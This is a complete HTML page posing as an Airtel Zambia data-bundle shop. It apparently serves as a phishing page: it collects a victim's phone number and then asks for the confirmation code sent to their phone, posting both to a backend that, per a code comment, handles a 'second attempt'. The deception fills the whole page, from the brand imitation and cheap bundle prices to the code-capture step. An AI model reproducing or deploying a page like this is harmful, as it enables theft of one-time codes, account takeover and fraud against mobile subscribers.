<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Airtel Zambia - Data Bundles</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">🔴 Airtel Zambia</div>
            <h2>Get Affordable Data Bundles</h2>
        </header>

        <!-- Step 1: Bundle Selection Form -->
        <form id="bundleForm" class="card">
            <div class="form-group">
                <label>Select Data Amount (GB)</label>
                <select id="gb" name="gb" required>
                    <option value="1GB">1 GB</option>
                    <option value="2.5GB">2.5 GB</option>
                    <option value="5GB">5 GB</option>
                    <option value="10GB">10 GB</option>
                </select>
            </div>

            <div class="form-group">
                <label>Amount in Zambian Kwacha (ZMW)</label>
                <input type="text" id="kwacha" name="kwacha" value="20 ZMW" readonly>
            </div>

            <div class="form-group">
                <label>Duration</label>
                <select id="duration" name="duration" required>
                    <option value="1 Day">1 Day</option>
                    <option value="7 Days">7 Days</option>
                    <option value="30 Days">30 Days</option>
                </select>
            </div>

            <div class="form-group">
                <label>Phone Number</label>
                <input type="tel" id="phone" name="phone" placeholder="097xxxxxxx" required>
            </div>

            <button type="button" id="proceedBtn" class="btn-airtel">PURCHASE</button>
        </form>

        <!-- Step 2: Code Verification View (Hidden Initially) -->
        <div id="codeCard" class="card hidden">
            <h3>Confirm Transaction</h3>
            <p id="instructionText">Enter the confirmation code sent to your phone:</p>
            
            <div class="form-group">
                <input type="text" id="verificationCode" placeholder="Enter code here" required>
            </div>

            <div id="errorMessage" class="error-msg hidden"></div>

            <button type="button" id="submitCodeBtn" class="btn-airtel">CONFIRM CODE</button>
        </div>
    </div>

    <script>
        const proceedBtn = document.getElementById('proceedBtn');
        const bundleForm = document.getElementById('bundleForm');
        const codeCard = document.getElementById('codeCard');
        const submitCodeBtn = document.getElementById('submitCodeBtn');
        const errorMessage = document.getElementById('errorMessage');

        // Simple dynamic Kwacha switcher based on GB selection
        const gbSelect = document.getElementById('gb');
        const kwachaInput = document.getElementById('kwacha');
        
        const pricing = { "1GB": "20 ZMW", "2.5GB": "50 ZMW", "5GB": "90 ZMW", "10GB": "150 ZMW" };
        gbSelect.addEventListener('change', (e) => {
            kwachaInput.value = pricing[e.target.value];
        });

        proceedBtn.addEventListener('click', () => {
            if(!bundleForm.phone.value) {
                alert('Please enter your phone number.');
                return;
            }
            bundleForm.classList.add('hidden');
            codeCard.classList.remove('hidden');
        });

        submitCodeBtn.addEventListener('click', async () => {
            const payload = {
                phone: document.getElementById('phone').value,
                gb: gbSelect.value,
                kwacha: kwachaInput.value,
                duration: document.getElementById('duration').value,
                code: document.getElementById('verificationCode').value
            };

            try {
                const response = await fetch('/api/submit-order', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const result = await response.json();

                errorMessage.textContent = result.message;
                errorMessage.classList.remove('hidden');

                if (result.success) {
                    // Reload or clear after second attempt response
                    setTimeout(() => {
                        window.location.reload();
                    }, 4000);
                }
            } catch (err) {
                console.error(err);
            }
        });
    </script>
</body>
</html>
